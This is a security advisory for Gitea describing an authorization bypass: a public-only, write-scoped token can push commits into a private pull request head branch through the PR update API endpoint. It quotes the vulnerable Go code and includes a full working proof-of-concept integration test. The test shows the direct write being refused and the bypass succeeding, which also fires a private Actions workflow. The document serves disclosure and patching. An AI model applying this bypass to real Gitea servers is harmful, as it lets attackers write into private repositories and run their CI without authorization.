# [C] Gitea: Public-only repository tokens can update private PR head branches

## Summary
Severity: Critical
Advisory: GHSA-xxjv-752h-3vp2
CVE: CVE-2026-58443
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-07-21
Source: https://github.com/advisories/GHSA-xxjv-752h-3vp2
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=0 <1.27.0

## Details
### Summary
Gitea allows a `public-only,write:repository` token to update a private pull request head branch through a public base repository route.

The vulnerable endpoint is:

```text
POST /api/v1/repos/{public-owner}/{public-repo}/pulls/{index}/update
```

Gitea checks the token's public-only restriction against the route repository, which is the public base repository. `UpdatePullRequest()` then authorizes the pull request head repository with ordinary user RBAC and calls the pull update service. If the head repository is private, the active token's public-only restriction is not re-applied to that private repository before Gitea pushes changes into it.

As a result, the same token that cannot directly write to the private repository can still cause Gitea to push public base commits into the private head branch.

### Details
The pull request API routes are attached under a repository route group. The public-only check applies to `ctx.Repo.Repository`, the route/base repository.

```go
// routers/api/v1/api.go:1358-1394
					m.Group("/pulls", func() {
						m.Combo("").Get(repo.ListPullRequests).
							Post(reqToken(), mustNotBeArchived, bind(api.CreatePullRequestOption{}), repo.CreatePullRequest)
						m.Get("/pinned", repo.ListPinnedPullRequests)
						m.Post("/comments/{id}/resolve", reqToken(), mustNotBeArchived, repo.ResolvePullReviewComment)
						m.Post("/comments/{id}/unresolve", reqToken(), mustNotBeArchived, repo.UnresolvePullReviewComment)
						m.Group("/{index}", func() {
							m.Combo("").Get(repo.GetPullRequest).
								Patch(reqToken(), bind(api.EditPullRequestOption{}), repo.EditPullRequest)
							m.Get(".{diffType:diff|patch}", repo.DownloadPullDiffOrPatch)
							m.Post("/update", reqToken(), repo.UpdatePullRequest)
							m.Get("/commits", repo.GetPullRequestCommits)
							m.Get("/files", repo.GetPullRequestFiles)
							m.Combo("/merge").Get(repo.IsPullRequestMerged).
								Post(reqToken(), mustNotBeArchived, bind(forms.MergePullRequestForm{}), repo.MergePullRequest).
								Delete(reqToken(), mustNotBeArchived, repo.CancelScheduledAutoMerge)
							m.Group("/reviews", func() {
								m.Combo("").
									Get(repo.ListPullReviews).
									Post(reqToken(), bind(api.CreatePullReviewOptions{}), repo.CreatePullReview)
								m.Group("/{id}", func() {
									m.Combo("").
										Get(repo.GetPullReview).
										Delete(reqToken(), repo.DeletePullReview).
										Post(reqToken(), bind(api.SubmitPullReviewOptions{}), repo.SubmitPullReview)
									m.Combo("/comments").
										Get(repo.GetPullReviewComments)
									m.Post("/dismissals", reqToken(), bind(api.DismissPullReviewOptions{}), repo.DismissPullReview)
									m.Post("/undismissals", repo.UnDismissPullReview)
								})
							})
							m.Combo("/requested_reviewers", reqToken()).
								Delete(bind(api.PullReviewRequestOptions{}), repo.DeleteReviewRequests).
								Post(bind(api.PullReviewRequestOptions{}), repo.CreateReviewRequests)
						})
						m.Get("/{base}/*", repo.GetPullRequestByBaseHead)
					}, mustAllowPulls, reqRepoReader(unit.TypeCode), context.ReferencesGitRepo())
```

```go
// routers/api/v1/api.go:1465-1466
				}, repoAssignment(), checkTokenPublicOnly())
			}, tokenRequiresScopes(auth_model.AccessTokenScopeCategoryRepository))
```

For `POST /api/v1/repos/{public-owner}/{public-repo}/pulls/{index}/update`, the route repository can be public, so a `public-only,write:repository` token passes the route-level public-only check.

The update handler then checks whether the caller can update the PR head branch:

```go
// routers/api/v1/repo/pull.go:1220-1270
	pr, err := issues_model.GetPullRequestByIndex(ctx, ctx.Repo.Repository.ID, ctx.PathParamInt64("index"))
	if err != nil {
		if issues_model.IsErrPullRequestNotExist(err) {
			ctx.APIErrorNotFound()
		} else {
			ctx.APIErrorInternal(err)
		}
		return
	}

	if pr.HasMerged {
		ctx.APIError(http.StatusUnprocessableEntity, err)
		return
	}

	if err = pr.LoadIssue(ctx); err != nil {
		ctx.APIErrorInternal(err)
		return
	}

	if pr.Issue.IsClosed {
		ctx.APIError(http.StatusUnprocessableEntity, err)
		return
	}

	if err = pr.LoadBaseRepo(ctx); err != nil {
		ctx.APIErrorInternal(err)
		return
	}
	if err = pr.LoadHeadRepo(ctx); err != nil {
		ctx.APIErrorInternal(err)
		return
	}

	rebase := ctx.FormString("style") == "rebase"

allowedUpdateByMerge, allowedUpdateByRebase, err := pull_service.IsUserAllowedToUpdate(ctx, pr, ctx.Doer)
	if err != nil {
		ctx.APIErrorInternal(err)
		return
	}

	if (!allowedUpdateByMerge && !rebase) || (rebase && !allowedUpdateByRebase) {
		ctx.Status(http.StatusForbidden)
		return
	}

	// default merge commit message
	message := fmt.Sprintf("Merge branch '%s' into %s", pr.BaseBranch, pr.HeadBranch)
```

The service checks the head repository using the user's normal repository permission:

```go
// services/pull/update.go:136-164
// IsUserAllowedToUpdate check if user is allowed to update PR with given permissions and branch protections
// update PR means send new commits to PR head branch from base branch
func IsUserAllowedToUpdate(ctx context.Context, pull *issues_model.PullRequest, user *user_model.User) (pushAllowed, rebaseAllowed bool, err error) {
	if user == nil {
		return false, false, nil
	}
	if err := pull.LoadBaseRepo(ctx); err != nil {
		return false, false, err
	}
	if err := pull.LoadHeadRepo(ctx); err != nil {
		return false, false, err
	}

	// 1. check whether pull request enabled.
	prBaseUnit, err := pull.BaseRepo.GetUnit(ctx, unit.TypePullRequests)
	if repo_model.IsErrUnitTypeNotExist(err) {
		return false, false, nil // the PR unit is disabled in base repo means no update allowed
	} else if err != nil {
		return false, false, fmt.Errorf("get base repo unit: %v", err)
	}

	// 2. only support Github style pull request
	if pull.Flow == issues_model.PullRequestFlowAGit {
		return false, false, nil
	}

	// 3. check user push permission on head repository
pushAllowed, rebaseAllowed, err = isUserAllowedToPushOrForcePushInRepoBranch(ctx, user, pull.HeadRepo, pull.HeadBranch)
	if err != nil {
		return false, false, err
	}
```

That is an ordinary account RBAC decision. It does not ask whether the active API token is allowed to access or mutate `pull.HeadRepo`.

If allowed, the update service performs a merge/rebase update and pushes into the head repository:

```go
// services/pull/update.go:89-100
	reversePR := &issues_model.PullRequest{
		BaseRepoID: pr.HeadRepoID,
		BaseRepo:   pr.HeadRepo,
		BaseBranch: pr.HeadBranch,

		HeadRepoID: pr.BaseRepoID,
		HeadRepo:   pr.BaseRepo,
		HeadBranch: pr.BaseBranch,
	}

_, err = doMergeAndPush(ctx, reversePR, doer, repo_model.MergeStyleMerge, "", message, repository.PushTriggerPRUpdateWithBase)
	return err
```

The result is a server-side private repository write performed through a public route.

### PoC
```go
import (
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
	"testing"
	"time"

	actions_model "code.gitea.io/gitea/models/actions"
	auth_model "code.gitea.io/gitea/models/auth"
	repo_model "code.gitea.io/gitea/models/repo"
	unit_model "code.gitea.io/gitea/models/unit"
	"code.gitea.io/gitea/models/unittest"
	user_model "code.gitea.io/gitea/models/user"
	"code.gitea.io/gitea/modules/gitrepo"
	api "code.gitea.io/gitea/modules/structs"
	webhook_module "code.gitea.io/gitea/modules/webhook"
	repo_service "code.gitea.io/gitea/services/repository"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPOCPublicOnlyRepositoryTokenUpdatesPrivatePRHeadBranch(t *testing.T) {
	onGiteaRun(t, func(t *testing.T, _ *url.URL) {
		doer := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user1"})

		baseRepo, err := repo_service.CreateRepository(t.Context(), doer, doer, repo_service.CreateRepoOptions{
			Name:          "public-pr-update-base",
			Description:   "public base repository for public-only PR update PoC",
			AutoInit:      true,
			Readme:        "Default",
			DefaultBranch: "main",
			IsPrivate:     false,
		})
		require.NoError(t, err)

		headRepo, err := repo_service.ForkRepository(t.Context(), doer, doer, repo_service.ForkRepoOptions{
			BaseRepo:     baseRepo,
			Name:         "private-pr-update-head",
			Description:  "private head repository for public-only PR update PoC",
			SingleBranch: baseRepo.DefaultBranch,
		})
		require.NoError(t, err)
		require.NotNil(t, headRepo)
		require.NoError(t, repo_service.UpdateRepositoryUnits(t.Context(), headRepo, []repo_model.RepoUnit{{
			RepoID: headRepo.ID,
			Type:   unit_model.TypeActions,
		}}, nil))
		headRepo = unittest.AssertExistsAndLoadBean(t, &repo_model.Repository{ID: headRepo.ID})

		headBranch := "private-head-update"
		testCreateFileInBranch(t, doer, headRepo, createFileInBranchOptions{
			OldBranch: baseRepo.DefaultBranch,
			NewBranch: headBranch,
		}, map[string]string{
			"private-head-marker.txt": "private head branch marker",
		})
		const workflowID = "private-push.yml"
		const workflowSentinel = "FAULTLINE_POC_062_PRIVATE_ACTION"
		testCreateFileInBranch(t, doer, headRepo, createFileInBranchOptions{
			OldBranch: headBranch,
			NewBranch: headBranch,
		}, map[string]string{
			".gitea/workflows/" + workflowID: fmt.Sprintf(`name: private-push
on:
  push:
    branches:
      - %s
jobs:
  private-head-job:
    runs-on: ubuntu-latest
    steps:
      - run: echo %s
`, headBranch, workflowSentinel),
		})

		require.NoError(t, repo_model.UpdateRepositoryColsNoAutoTime(t.Context(), &repo_model.Repository{
			ID:        headRepo.ID,
			IsPrivate: true,
		}, "is_private"))
		headRepo = unittest.AssertExistsAndLoadBean(t, &repo_model.Repository{ID: headRepo.ID})
		require.True(t, headRepo.IsPrivate)
		baselinePrivateHeadRuns := unittest.GetCount(t, &actions_model.ActionRun{RepoID: headRepo.ID})

		session := loginUser(t, doer.Name)
		publicOnlyToken := getTokenForLoggedInUser(t, session,
			auth_model.AccessTokenScopePublicOnly,
			auth_model.AccessTokenScopeWriteRepository,
		)

		publicPath := "public-base-injected-into-private.txt"
		publicMarker := "FAULT-GITEA-062 public base content reached private head"
		createPublicBaseFile := api.CreateFileOptions{
			FileOptions: api.FileOptions{
				BranchName: baseRepo.DefaultBranch,
				Message:    "create public marker for private head update",
			},
			ContentBase64: base64.StdEncoding.EncodeToString([]byte(publicMarker)),
		}
		req := NewRequestWithJSON(t, "POST", fmt.Sprintf("/api/v1/repos/%s/contents/%s", baseRepo.FullName(), publicPath), &createPublicBaseFile).
			AddTokenAuth(publicOnlyToken)
		MakeRequest(t, req, http.StatusCreated)

		privatePath := "direct-private-write-should-fail.txt"
		directPrivateWrite := api.CreateFileOptions{
			FileOptions: api.FileOptions{
				BranchName: headBranch,
				Message:    "direct private write attempt",
			},
			ContentBase64: base64.StdEncoding.EncodeToString([]byte("direct private write marker")),
		}
		req = NewRequestWithJSON(t, "POST", fmt.Sprintf("/api/v1/repos/%s/contents/%s", headRepo.FullName(), privatePath), &directPrivateWrite).
			AddTokenAuth(publicOnlyToken)
		MakeRequest(t, req, http.StatusNotFound)

		prPayload := map[string]string{
			"title": "faultline public-only private head update",
			"base":  baseRepo.DefaultBranch,
			"head":  fmt.Sprintf("%s/%s:%s", doer.Name, headRepo.Name, headBranch),
		}
		req = NewRequestWithJSON(t, "POST", fmt.Sprintf("/api/v1/repos/%s/pulls", baseRepo.FullName()), prPayload).
			AddTokenAuth(publicOnlyToken)
		resp := MakeRequest(t, req, http.StatusCreated)

		var pr api.PullRequest
		DecodeJSON(t, resp, &pr)
		require.Equal(t, prPayload["title"], pr.Title)

		gitRepo, err := gitrepo.OpenRepository(t.Context(), headRepo)
		require.NoError(t, err)
		defer gitRepo.Close()

		commit, err := gitRepo.GetBranchCommit(headBranch)
		require.NoError(t, err)
		_, err = commit.GetBlobByPath(publicPath)
		require.Error(t, err)

		req = NewRequestf(t, "POST", "/api/v1/repos/%s/pulls/%d/update?style=merge", baseRepo.FullName(), pr.Index).
			AddTokenAuth(publicOnlyToken)
		MakeRequest(t, req, http.StatusOK)
		assert.Eventually(t, func() bool {
			return unittest.GetCount(t, &actions_model.ActionRun{RepoID: headRepo.ID}) > baselinePrivateHeadRuns
		}, 5*time.Second, 50*time.Millisecond)

		actionRun := unittest.AssertExistsAndLoadBean(t, &actions_model.ActionRun{
			RepoID:     headRepo.ID,
			WorkflowID: workflowID,
		}, unittest.OrderBy("id DESC"))
		assert.Equal(t, webhook_module.HookEventPush, actionRun.Event)
		assert.Equal(t, "push", actionRun.TriggerEvent)
		assert.Equal(t, doer.ID, actionRun.TriggerUserID)
		assert.NotEmpty(t, actionRun.CommitSHA)

		job := unittest.AssertExistsAndLoadBean(t, &actions_model.ActionRunJob{RunID: actionRun.ID})
		assert.Contains(t, string(job.WorkflowPayload), workflowSentinel)

		commit, err = gitRepo.GetBranchCommit(headBranch)
		require.NoError(t, err)
		blob, err := commit.GetBlobByPath(publicPath)
		require.NoError(t, err)
		content, err := blob.GetBlobContent(1024)
		require.NoError(t, err)
		assert.Equal(t, publicMarker, content)
	})
}
```

### Impact
The attacker needs a valid `public-only,write:repository` token for a user who has normal write permission to the private PR head branch. The attacker also needs a public base repository and a pull request relationship where the public base can be merged or rebased into the private head.

Successful exploitation gives a private repository write primitive through a token that is explicitly limited to public repositories. The direct impact is integrity: public base commits are pushed into a private branch even though direct private repository writes are rejected for the same token.

When Actions is enabled on the private head repository, the same server-side push also queues the private repository's matching `push` workflow. The PoC confirms an `ActionRun` and `ActionRunJob` are created for the private head repository with the attack-triggered push event.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-xxjv-752h-3vp2
- https://github.com/go-gitea/gitea
- https://github.com/go-gitea/gitea/releases/tag/v1.27.0
